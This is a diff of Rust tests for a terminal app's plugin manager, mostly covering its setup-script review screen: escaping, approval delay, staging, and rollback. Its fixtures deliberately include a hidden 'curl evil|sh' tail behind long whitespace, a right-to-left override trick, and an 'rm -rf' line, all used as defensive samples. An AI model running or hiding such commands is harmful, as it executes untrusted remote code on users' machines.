+                ("good", ["Team gateway", "● ok", "● on", "actions", "[-]"]),
+                ("bad", ["bad", "× failed", "● on", "[-]", "[-]"]),
+                ("offp", ["offp", "·", "○ off", "[-]", "[-]"]),
+                ("gitp", ["gitp", "● ok", "● on", "↻ update", "[-]"]),
+            ] {
+                let l = line_with(&lines, &format!(" {name} "));
+                for t in want {
+                    assert!(l.contains(t), "{name} at {w}: {t} not in {l}");
+                }
+            }
+            assert!(!line_with(&lines, " good ").contains("update"));
+            assert!(line_with(&lines, " cliproxy ").contains("[+]"));
+            line_with(&lines, " back");
+            assert!(!lines.iter().any(|l| l.contains("secret")));
+            assert!(!lines.iter().any(|l| l.contains('⚙')));
+        }
+        // a click on a row selects it, on [+ Add] opens the form inside the screen
+        let (_, hits) = screen(&a);
+        let (row, i) = hits.plugin_rows[2];
+        click(&mut a, &hits, row.x, row.y);
+        assert_eq!(a.plugins_win.as_ref().unwrap().sel, i);
+        let add = hits
+            .plugin_btns
+            .iter()
+            .find(|(_, it, _)| *it == names_of(&a).len() - 1)
+            .unwrap()
+            .0;
+        click(&mut a, &hits, add.x, add.y);
+        assert!(a.plugins_win.as_ref().unwrap().form.is_some());
+        assert!(a.modal.is_none(), "the form is in the screen, not a window");
     }
 
     #[cfg(unix)]
     #[test]
-    fn plugins_window_d_asks_then_removes_and_u_needs_git() {
+    fn search_filters_both_lists_by_name_and_about() {
         let mut a = plugin_app();
+        fs::write(a.paths.plugins.join("good/about"), "Team Gateway\n").unwrap();
+        a.refresh();
         key(&mut a, KeyCode::Char('P'));
+        key(&mut a, KeyCode::Char('/'));
+        // q and j are text while searching
+        typed(&mut a, "gateway");
+        assert_eq!(names_of(&a), ["good", "add"]);
+        assert!(a.plugins_win.is_some());
+        let (lines, _) = screen(&a);
+        line_with(&lines, "search: gateway");
+        for _ in 0.."gateway".len() {
+            key(&mut a, KeyCode::Backspace);
+        }
+        typed(&mut a, "PROXY");
+        assert_eq!(names_of(&a), ["+cliproxy", "add"]);
+        key(&mut a, KeyCode::Enter);
+        assert!(!a.plugins_win.as_ref().unwrap().searching);
+        assert_eq!(a.plugins_win.as_ref().unwrap().search, "PROXY");
+        key(&mut a, KeyCode::Char('/'));
+        key(&mut a, KeyCode::Backspace);
+        typed(&mut a, "q");
+        assert_eq!(names_of(&a), ["add"]);
+        assert!(a.plugins_win.is_some() && !a.quit);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn esc_closes_form_then_search_then_screen() {
+        let mut a = plugin_app();
+        let w = |a: &App| {
+            a.plugins_win
+                .as_ref()
+                .map(|w| (w.form.is_some(), w.search.clone(), w.searching))
+        };
+        key(&mut a, KeyCode::Char('P'));
+        key(&mut a, KeyCode::Char('/'));
+        typed(&mut a, "go");
+        key(&mut a, KeyCode::Enter);
+        key(&mut a, KeyCode::Char('+'));
+        assert_eq!(w(&a), Some((true, "go".into(), false)));
+        key(&mut a, KeyCode::Esc);
+        assert_eq!(w(&a), Some((false, "go".into(), false)));
+        key(&mut a, KeyCode::Esc);
+        assert_eq!(w(&a), Some((false, "".into(), false)));
+        key(&mut a, KeyCode::Esc);
+        assert_eq!(w(&a), None);
+        // while searching: esc clears the text, then leaves search, then closes
+        key(&mut a, KeyCode::Char('P'));
+        key(&mut a, KeyCode::Char('/'));
+        typed(&mut a, "go");
+        key(&mut a, KeyCode::Esc);
+        assert_eq!(w(&a), Some((false, "".into(), true)));
+        key(&mut a, KeyCode::Esc);
+        assert_eq!(w(&a), Some((false, "".into(), false)));
+        key(&mut a, KeyCode::Esc);
+        assert_eq!(w(&a), None);
+        // home's p opens the screen with the form open
+        key(&mut a, KeyCode::Char('p'));
+        assert_eq!(w(&a), Some((true, "".into(), false)));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn minus_asks_then_removes() {
+        let mut a = plugin_app();
         pwin_select(&mut a, "bad");
         key(&mut a, KeyCode::Char('u'));
         assert!(
-            a.flash
-                .as_ref()
-                .is_some_and(|(m, _)| m.contains("not installed from git")),
-            "{:?}",
-            a.flash
+            flash(&a).contains("not installed from git"),
+            "{}",
+            flash(&a)
         );
-        key(&mut a, KeyCode::Char('d'));
+        key(&mut a, KeyCode::Char('-'));
         let Some(Modal::Confirm(c)) = &a.modal else {
             panic!("no confirm")
         };
         assert_eq!(c.id, "plugin:bad");
         key(&mut a, KeyCode::Char('n'));
         assert!(a.paths.plugins.join("bad").exists());
-        key(&mut a, KeyCode::Char('d'));
+        // the [-] on its row asks too
+        let (_, hits) = screen(&a);
+        let sel = a.plugins_win.as_ref().unwrap().sel;
+        let minus = hits
+            .plugin_btns
+            .iter()
+            .find(|(_, it, k)| *it == sel && *k == KeyCode::Char('-'))
+            .unwrap()
+            .0;
+        click(&mut a, &hits, minus.x, minus.y);
+        assert!(matches!(&a.modal, Some(Modal::Confirm(c)) if c.id == "plugin:bad"));
         key(&mut a, KeyCode::Char('y'));
         assert!(!a.paths.plugins.join("bad").exists());
         assert!(a.plugins.iter().all(|s| s.plugin.name != "bad"));
-        assert!(a.plugins_win.is_some(), "back in the window");
+        assert!(a.plugins_win.is_some(), "back in the screen");
         screen(&a);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn plus_on_available_with_setup_opens_review() {
+        let mut a = plugin_app();
+        key(&mut a, KeyCode::Char('P'));
+        let at = names_of(&a).iter().position(|n| n == "+cliproxy").unwrap();
+        assert!(a.available[0].has_setup);
+        let (_, hits) = screen(&a);
+        let plus = hits
+            .plugin_btns
+            .iter()
+            .find(|(_, it, k)| *it == at && *k == KeyCode::Char('+'))
+            .unwrap()
+            .0;
+        click(&mut a, &hits, plus.x, plus.y);
+        let done = |a: &App| flash(a).contains("Installed") || review(a).is_some();
+        settle(&mut a, done);
+        assert!(review(&a).is_some(), "{}", flash(&a));
+        // staged only: nothing installed until the review is approved
+        assert!(!a.paths.plugins.join("cliproxy/plugin").exists());
+        assert!(a.paths.plugins.join(".cliproxy.install/setup").is_file());
+        {
+            use std::os::unix::fs::PermissionsExt;
+            let m = fs::metadata(a.paths.plugins.join(".cliproxy.install/setup")).unwrap();
+            assert_eq!(m.permissions().mode() & 0o111, 0o111);
+        }
+        assert!(a.plugins_win.is_some());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn plus_on_installed_opens_add_form() {
+        let mut a = plugin_app();
+        let src = plugin_script(&a, "x", GOOD);
+        let src2 = a.paths.home.join("src/mine");
+        fs::create_dir_all(src2.parent().unwrap()).unwrap();
+        fs::rename(&src, &src2).unwrap();
+        fs::write(src2.join("setup"), "#!/bin/sh\n").unwrap();
+        let withsetup = a.paths.home.join("src/withsetup");
+        crate::failover::copy_dir(&src2, &withsetup).unwrap();
+        fs::remove_file(src2.join("setup")).unwrap();
+        a.refresh();
+        pwin_select(&mut a, "good");
+        for (src, want) in [(&src2, "Installed plugin mine"), (&withsetup, "review")] {
+            key(&mut a, KeyCode::Char('+'));
+            assert!(a.plugins_win.as_ref().unwrap().form.is_some());
+            a.on_paste(&src.to_string_lossy());
+            key(&mut a, KeyCode::Enter);
+            key(&mut a, KeyCode::Enter);
+            assert!(a.plugins_win.as_ref().unwrap().form.is_none());
+            if want == "review" {
+                settle(&mut a, |a| review(a).is_some());
+                assert!(review(&a).is_some(), "{}", flash(&a));
+                key(&mut a, KeyCode::Esc);
+            } else {
+                settle(&mut a, |a| flash(a).contains(want));
+                assert!(flash(&a).contains(want), "{}", flash(&a));
+            }
+            pwin_select(&mut a, "good");
+        }
+        assert!(a.paths.plugins.join("mine/plugin").is_file());
+        assert!(!a.paths.plugins.join("withsetup").exists());
+        assert!(!a.paths.plugins.join(".withsetup.install").exists());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn space_toggles_off_file() {
+        let mut a = plugin_app();
+        let off = a.paths.plugins.join("good/.off");
+        pwin_select(&mut a, "good");
+        key(&mut a, KeyCode::Char(' '));
+        assert!(off.exists());
+        key(&mut a, KeyCode::Char('o'));
+        assert!(!off.exists());
+        key(&mut a, KeyCode::Down);
+        assert_eq!(names_of(&a)[a.plugins_win.as_ref().unwrap().sel], "offp");
+        // a click on good's pill toggles it and selects it
+        let (_, hits) = screen(&a);
+        let at = names_of(&a).iter().position(|n| n == "good").unwrap();
+        let pill = hits
+            .plugin_btns
+            .iter()
+            .find(|(_, it, k)| *it == at && *k == KeyCode::Char(' '))
+            .unwrap()
+            .0;
+        click(&mut a, &hits, pill.x, pill.y);
+        assert_eq!(a.plugins_win.as_ref().unwrap().sel, at);
+        assert!(off.exists());
+    }
+
+    #[test]
+    fn home_button_has_no_emoji() {
+        let mut a = app();
+        let allowed = |c: char| c.is_ascii_alphanumeric() || " +-✻●○↻✎×›·▌".contains(c);
+        for wrr in [false, true] {
+            a.wrr = wrr;
+            let labels = crate::ui::home_buttons(&a);
+            assert!(labels.contains(&(" Plugins ", Button::Plugins)));
+            for (l, _) in labels {
+                assert!(l.chars().all(allowed), "{l}");
+            }
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn available_empty_says_no_other_bundled_plugins() {
+        let mut a = plugin_app();
+        let s = plugins::stage(&a.paths, "cliproxy").unwrap();
+        plugins::commit(&a.paths, &s).unwrap();
+        a.refresh();
+        key(&mut a, KeyCode::Char('P'));
+        assert!(a.available.is_empty());
+        let (lines, _) = screen(&a);
+        line_with(&lines, "no other bundled plugins");
+        line_with(&lines, "5 installed · 0 available");
+        // bundled source shows nowhere secret; + on the add button opens the form
+        let n = names_of(&a).len();
+        a.plugins_win.as_mut().unwrap().sel = n - 1;
+        key(&mut a, KeyCode::Char('+'));
+        assert!(a.plugins_win.as_ref().unwrap().form.is_some());
+    }
+
+    // ── setup review and setup tab ────────────────────────
+
+    /// A plugin source folder `<home>/src/<name>` with `plugin` (GOOD) and `setup` = `setup`.
+    #[cfg(unix)]
+    fn setup_src(a: &App, name: &str, setup: &str) -> PathBuf {
+        let d = plugin_script(a, name, GOOD);
+        fs::write(d.join("setup"), setup).unwrap();
+        let src = a.paths.home.join("src").join(name);
+        fs::create_dir_all(src.parent().unwrap()).unwrap();
+        fs::rename(&d, &src).unwrap();
+        src
+    }
+
+    fn review(a: &App) -> Option<&Review> {
+        a.plugins_win.as_ref().and_then(|w| w.review.as_ref())
+    }
+
+    /// Installs `src` from the Plugins screen and waits for its review to open.
+    #[cfg(unix)]
+    fn staged_for_review(a: &mut App, src: &std::path::Path) {
+        if a.plugins_win.is_none() {
+            a.focus = Focus::Home;
+            key(a, KeyCode::Char('P'));
+        }
+        a.install(src.to_string_lossy().into_owned());
+        settle(a, |a| review(a).is_some());
+        assert!(review(a).is_some(), "{}", flash(a));
+        ready(a);
+    }
+
+    /// Draws the open review once (it records its size) and moves it past `APPROVE_DELAY`.
+    fn ready(a: &mut App) {
+        screen(a);
+        if let Some(r) = a.plugins_win.as_mut().and_then(|w| w.review.as_mut()) {
+            r.opened = Instant::now() - APPROVE_DELAY - Duration::from_millis(10);
+        }
+    }
+
+    fn tab_text(a: &App, t: usize) -> String {
+        a.tabs[t].pane.as_ref().map_or(String::new(), |p| {
+            p.screen.lock().unwrap().screen().contents()
+        })
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn plus_on_setup_plugin_opens_review_and_installs_nothing_yet() {
+        let mut a = plugin_app();
+        let src = setup_src(&a, "mine", "#!/bin/sh\nset -e\necho hi\n");
+        staged_for_review(&mut a, &src);
+        let staging = a.paths.plugins.join(".mine.install");
+        assert!(staging.join("plugin").is_file());
+        assert!(
+            !a.paths.plugins.join("mine").exists(),
+            "nothing installed yet"
+        );
+        let (lines, hits) = screen(&a);
+        line_with(&lines, "Plugins › install mine");
+        let head = line_with(&lines, "SETUP SCRIPT · review before running");
+        assert!(head.contains("setup · 3 lines"), "{head}");
+        line_with(&lines, "1  #!/bin/sh");
+        line_with(&lines, "3  echo hi");
+        line_with(
+            &lines,
+            "Runs in a terminal tab as you. The plugin is installed only if setup succeeds.",
+        );
+        line_with(
+            &lines,
+            "The plugin's own code also runs with your permissions: install only plugins you trust.",
+        );
+        let buttons = line_with(&lines, "[ Approve and install ]");
+        assert!(buttons.contains("[ Cancel ]"), "{buttons}");
+        let foot = line_with(&lines, "approve");
+        assert!(foot.contains("PgUp PgDn") && foot.contains("scroll") && foot.contains("cancel"));
+        assert!(hits.plugin_btns.iter().any(|b| b.2 == KeyCode::Enter));
+        // a second install of the same name is ignored while this one is in review
+        a.install(src.to_string_lossy().into_owned());
+        assert!(
+            flash(&a).contains("mine is already being installed"),
+            "{}",
+            flash(&a)
+        );
+        std::thread::sleep(Duration::from_millis(200));
+        a.tick();
+        assert!(staging.join("plugin").is_file(), "the live staging stays");
+        assert!(review(&a).is_some());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn review_cancel_aborts_staging() {
+        let mut a = plugin_app();
+        let src = setup_src(&a, "mine", "echo hi\n");
+        staged_for_review(&mut a, &src);
+        let staging = a.paths.plugins.join(".mine.install");
+        key(&mut a, KeyCode::Esc);
+        assert!(review(&a).is_none() && a.plugins_win.is_some());
+        assert!(!staging.exists());
+        assert!(!a.paths.plugins.join("mine").exists());
+        assert_eq!(flash(&a), "cancelled: plugin not installed");
+        // the [ Cancel ] button does the same, and the name is free again
+        staged_for_review(&mut a, &src);
+        let (_, hits) = screen(&a);
+        let cancel = hits
+            .plugin_btns
+            .iter()
+            .find(|b| b.2 == KeyCode::Esc)
+            .unwrap()
+            .0;
+        click(&mut a, &hits, cancel.x, cancel.y);
+        assert!(review(&a).is_none());
+        assert!(!staging.exists());
+        assert!(a.tabs.is_empty());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn review_shows_control_bytes_escaped() {
+        let mut a = plugin_app();
+        let src = setup_src(
+            &a,
+            "mine",
+            "echo \x1b[31mred\x07\r\necho \u{202e}evil\u{9b}\n",
+        );
+        staged_for_review(&mut a, &src);
+        let (lines, _) = screen(&a);
+        line_with(&lines, "echo ^[[31mred^G^M");
+        line_with(&lines, "echo <U+202E>evil<M-^[>");
+        // invisible and blank-looking characters, each shown by its code
+        let odd = [
+            '\u{ad}',
+            '\u{34f}',
+            '\u{115f}',
+            '\u{1160}',
+            '\u{3164}',
+            '\u{ffa0}',
+            '\u{fe0f}',
+            '\u{e0041}',
+            '\u{a0}',
+            '\u{2003}',
+            '\u{3000}',
+            '\u{fffa}',
+        ];
+        for c in odd {
+            let shown = crate::ui::escape_line(&format!("a{c}b"));
+            assert_eq!(shown, format!("a<U+{:04X}>b", c as u32));
+        }
+        assert_eq!(crate::ui::escape_line("héllo 日本 -x"), "héllo 日本 -x");
+        let all = lines.concat();
+        assert!(
+            !all.chars().any(|c| c.is_control() || c == '\u{202e}'),
+            "raw control chars reached the screen"
+        );
+        // a long line wraps instead of hiding its end past the edge
+        let long = format!("echo {}; rm -rf /tmp/nothing\n", "x".repeat(200));
+        let src2 = setup_src(&a, "longp", &long);
+        key(&mut a, KeyCode::Esc);
+        staged_for_review(&mut a, &src2);
+        let (lines, _) = screen(&a);
+        line_with(&lines, "rm -rf /tmp/nothing");
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn approve_opens_setup_tab_in_staging() {
+        let mut a = plugin_app();
+        let src = setup_src(
+            &a,
+            "mine",
+            "echo \"dir=$AI_PLUGIN_DIR\"\necho \"pwd=$(pwd -P)\"\nsleep 30\n",
+        );
+        staged_for_review(&mut a, &src);
+        let staging = a.paths.plugins.join(".mine.install");
+        key(&mut a, KeyCode::Enter);
+        assert!(a.plugins_win.is_none(), "the tab shows");
+        assert_eq!(a.tabs.len(), 1);
+        assert_eq!(a.tabs[0].member, "setup:mine");
+        assert!(a.in_tab());
+        let real = staging.canonicalize().unwrap();
+        settle(&mut a, |a| tab_text(a, 0).contains("pwd="));
+        let text = tab_text(&a, 0).replace('\n', "");
+        assert!(
+            text.contains(&format!("dir={}", staging.display())),
+            "{text}"
+        );
+        assert!(text.contains(&format!("pwd={}", real.display())), "{text}");
+        assert!(
+            !a.paths.plugins.join("mine").exists(),
+            "not installed while it runs"
+        );
+        assert!(staging.exists());
+        // a second install while it runs is ignored
+        a.install(src.to_string_lossy().into_owned());
+        assert!(flash(&a).contains("already being installed"));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn setup_exit_zero_commits() {
+        let mut a = plugin_app();
+        let src = setup_src(&a, "mine", "echo ok > \"$AI_PLUGIN_DIR/did\"\nexit 0\n");
+        staged_for_review(&mut a, &src);
+        let staging = a.paths.plugins.join(".mine.install");
+        // what runs is the text reviewed, not the file read again
+        fs::write(staging.join("setup"), "exit 9\n").unwrap();
+        key(&mut a, KeyCode::Enter);
+        let copy = a.setups[0].copy.clone();
+        assert!(copy.is_file());
+        settle(&mut a, |a| flash(a).contains("installed plugin mine"));
+        assert_eq!(flash(&a), "installed plugin mine");
+        let dest = a.paths.plugins.join("mine");
+        assert!(dest.join("plugin").is_file() && dest.join("did").is_file());
+        assert!(!staging.exists());
+        assert!(!copy.exists(), "the temp copy is removed");
+        assert!(a.setups.is_empty());
+        assert!(a.plugins.iter().any(|s| s.plugin.name == "mine"));
+        // enter on the ended setup tab closes it (nothing to start again)
+        key(&mut a, KeyCode::Enter);
+        assert!(a.tabs.is_empty());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn setup_exit_nonzero_aborts() {
+        let mut a = plugin_app();
+        let src = setup_src(&a, "mine", "exit 4\n");
+        staged_for_review(&mut a, &src);
+        key(&mut a, KeyCode::Enter);
+        let copy = a.setups[0].copy.clone();
+        settle(&mut a, |a| flash(a).contains("setup failed"));
+        assert_eq!(flash(&a), "setup failed (exit 4): plugin not installed");
+        assert!(!a.paths.plugins.join(".mine.install").exists());
+        assert!(!a.paths.plugins.join("mine").exists());
+        assert!(!copy.exists());
+        // the name is free again
+        staged_for_review(&mut a, &src);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn closing_setup_tab_aborts() {
+        let mut a = plugin_app();
+        let src = setup_src(&a, "mine", "sleep 30\n");
+        staged_for_review(&mut a, &src);
+        key(&mut a, KeyCode::Enter);
+        let copy = a.setups[0].copy.clone();
+        a.focus = Focus::Home;
+        key(&mut a, KeyCode::Char('x'));
+        assert!(a.tabs.is_empty());
+        a.tick();
+        assert_eq!(flash(&a), "setup failed (tab closed): plugin not installed");
+        assert!(!a.paths.plugins.join(".mine.install").exists());
+        assert!(!a.paths.plugins.join("mine").exists());
+        assert!(!copy.exists());
+        assert!(a.setups.is_empty());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn rerun_backs_up_config_and_keeps_plugin_on_failure() {
+        let mut a = plugin_app();
+        // no setup script: s says so
+        pwin_select(&mut a, "good");
+        key(&mut a, KeyCode::Char('s'));
+        assert_eq!(flash(&a), "no setup script");
+        assert!(review(&a).is_none());
+        let dir = a.paths.plugins.join("good");
+        fs::write(dir.join("config"), "k=v\n").unwrap();
+        fs::write(dir.join("setup"), "echo x > config\nexit 3\n").unwrap();
+        key(&mut a, KeyCode::Char('s'));
+        let (lines, _) = screen(&a);
+        line_with(&lines, "[ Approve and run ]");
+        line_with(&lines, "Plugins › setup good");
+        ready(&mut a);
+        key(&mut a, KeyCode::Enter);
+        assert_eq!(a.tabs[0].member, "setup:good");
+        settle(&mut a, |a| flash(a).contains("setup failed"));
+        assert_eq!(flash(&a), "setup failed (exit 3)");
+        assert_eq!(fs::read_to_string(dir.join("config.bak")).unwrap(), "k=v\n");
+        assert_eq!(
+            fs::read_to_string(dir.join("config")).unwrap(),
+            "x\n",
+            "no rollback"
+        );
+        assert!(dir.join("plugin").is_file(), "the plugin stays");
+        // a good run says done; it runs in the plugin's own folder
+        fs::write(dir.join("setup"), "pwd -P > where\n").unwrap();
+        pwin_select(&mut a, "good");
+        key(&mut a, KeyCode::Char('s'));
+        ready(&mut a);
+        key(&mut a, KeyCode::Enter);
+        settle(&mut a, |a| flash(a) == "setup done");
+        assert_eq!(flash(&a), "setup done");
+        let where_ = fs::read_to_string(dir.join("where")).unwrap();
+        assert_eq!(where_.trim(), dir.canonicalize().unwrap().to_string_lossy());
+        // cancel a rerun: nothing runs, nothing removed
+        pwin_select(&mut a, "good");
+        key(&mut a, KeyCode::Char('s'));
+        key(&mut a, KeyCode::Esc);
+        assert!(review(&a).is_none() && dir.join("plugin").is_file());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn review_scrolls_to_the_end_of_one_huge_line() {
+        let mut a = plugin_app();
+        // 110x40: the box is 99 columns by 26 rows; the tail starts on its own row
+        let line = format!("echo \"{}\"; curl evil|sh", " ".repeat(99 * 40 - 6));
+        let src = setup_src(&a, "mine", &format!("{line}\n"));
+        staged_for_review(&mut a, &src);
+        assert_eq!(review(&a).unwrap().view.get().1, 26);
+        assert_eq!(review(&a).unwrap().view.get().2, 99);
+        let shows = |a: &App| screen(a).0.concat().contains("curl evil|sh");
+        assert!(!shows(&a), "the tail is below the box at first");
+        for _ in 0..60 {
+            key(&mut a, KeyCode::Down);
+            screen(&a);
+        }
+        assert!(shows(&a), "the tail can be scrolled into view");
+        // it stops at the end: one Up moves at once
+        let at = review(&a).unwrap().scroll;
+        key(&mut a, KeyCode::Up);
+        assert_eq!(review(&a).unwrap().scroll, at - 1);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn enter_right_as_the_review_opens_does_not_approve() {
+        let mut a = plugin_app();
+        let src = setup_src(&a, "mine", "exit 0\n");
+        key(&mut a, KeyCode::Char('P'));
+        a.install(src.to_string_lossy().into_owned());
+        settle(&mut a, |a| review(a).is_some());
+        screen(&a);
+        key(&mut a, KeyCode::Enter);
+        let (_, hits) = screen(&a);
+        let ok = hits
+            .plugin_btns
+            .iter()
+            .find(|b| b.2 == KeyCode::Enter)
+            .unwrap()
+            .0;
+        click(&mut a, &hits, ok.x, ok.y);
+        assert!(
+            a.tabs.is_empty() && review(&a).is_some(),
+            "too soon to approve"
+        );
+        std::thread::sleep(APPROVE_DELAY);
+        screen(&a);
+        key(&mut a, KeyCode::Enter);
+        assert_eq!(a.tabs.len(), 1, "{}", flash(&a));
+        assert_eq!(a.tabs[0].member, "setup:mine");
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn staging_done_while_in_a_tab_waits_for_the_plugins_screen() {
+        let mut a = plugin_app();
+        let src = setup_src(&a, "mine", "exit 0\n");
+        a.install(src.to_string_lossy().into_owned());
+        a.open("t1");
+        assert!(a.in_tab());
+        settle(&mut a, |a| flash(a).contains("ready to review"));
+        assert_eq!(flash(&a), "mine ready to review: open Plugins");
+        assert!(a.plugins_win.is_none(), "no review over the tab");
+        key(&mut a, KeyCode::Enter);
+        assert!(
+            a.setups.is_empty() && a.plugins_win.is_none(),
+            "keys stay the tab's"
+        );
+        assert!(a.paths.plugins.join(".mine.install").exists());
+        // still busy while it waits
+        a.install(src.to_string_lossy().into_owned());
+        assert!(flash(&a).contains("already being installed"));
+        a.focus = Focus::Home;
+        key(&mut a, KeyCode::Char('P'));
+        assert!(review(&a).is_some_and(|r| r.target.name() == "mine"));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn tiny_window_refuses_approval() {
+        let mut a = plugin_app();
+        let src = setup_src(&a, "mine", "exit 0\n");
+        staged_for_review(&mut a, &src);
+        screen_at(&a, 8);
+        key(&mut a, KeyCode::Enter);
+        assert_eq!(flash(&a), "window too small to review");
+        assert!(a.tabs.is_empty() && review(&a).is_some());
+        screen(&a);
+        key(&mut a, KeyCode::Enter);
+        assert_eq!(a.tabs.len(), 1);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn minus_refuses_while_busy() {
+        let mut a = plugin_app();
+        let dir = a.paths.plugins.join("good");
+        fs::write(dir.join("setup"), "sleep 30\n").unwrap();
+        pwin_select(&mut a, "good");
+        // a setup running in its folder
+        key(&mut a, KeyCode::Char('s'));
+        ready(&mut a);
+        key(&mut a, KeyCode::Enter);
+        assert_eq!(a.tabs.len(), 1);
+        pwin_select(&mut a, "good");
+        key(&mut a, KeyCode::Char('-'));
+        assert!(a.modal.is_none(), "no delete while its setup runs");
+        assert_eq!(flash(&a), "good is busy: remove it after its setup ends.");
+        assert!(dir.join("plugin").is_file());
     }
 }
